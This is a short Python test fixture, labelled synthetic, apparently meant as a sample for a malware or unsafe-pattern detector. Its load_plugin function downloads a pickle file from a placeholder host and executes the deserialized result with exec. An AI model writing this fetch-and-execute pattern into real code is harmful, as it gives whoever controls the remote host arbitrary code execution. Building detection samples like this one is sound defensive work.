# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Inert sample: exec(pickle.loads(<remote>)) — deserialize-and-execute from the network."""
import pickle

import urllib.request


def load_plugin() -> None:
    data = urllib.request.urlopen("https://stage.example.test/p.pkl").read()
    exec(pickle.loads(data))
